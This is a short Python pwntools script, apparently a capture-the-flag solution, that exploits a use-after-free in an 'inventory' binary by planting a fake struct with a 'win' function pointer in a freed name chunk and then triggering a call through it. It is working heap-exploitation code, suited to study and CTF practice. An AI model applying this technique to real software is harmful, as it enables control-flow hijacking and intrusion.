#!/usr/bin/env python3 
from pwn import *

def add_item(r):
    r.recvuntil(b"> ")
    r.sendline(b"1")

def assign_name(r, index, name):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.sendline(str(index).encode())
    r.sendline(name)
    r.sendlineafter(b"Unknown item type. Please enter the price manually\n", b"1337")

def remove_name(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"5")
    r.sendline(str(index).encode())

def view_item(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.sendline(str(index).encode())


r = process("./inventory")
#r = remote("host1.metaproblems.com", 5300)

e = ELF("./inventory")
fake_struct = b"".join(p64(x) for x in [
    0x4141414141414141, # price
    0x4242424242424242, # name ptr
    e.symbols['win'],   # function ptr
])

# create item_0
add_item(r)
# add name to item_0 which contains our faked struct
assign_name(r, 0, fake_struct)
# free name so it ends up in cache
remove_name(r, 0)
# add a new item which reuses our faked struct chunk
add_item(r)
# add a name so itemlist[select]->itemname != NULL passes
assign_name(r, 1, b"PogChamp")
# trigger function call
view_item(r, 1)

r.interactive()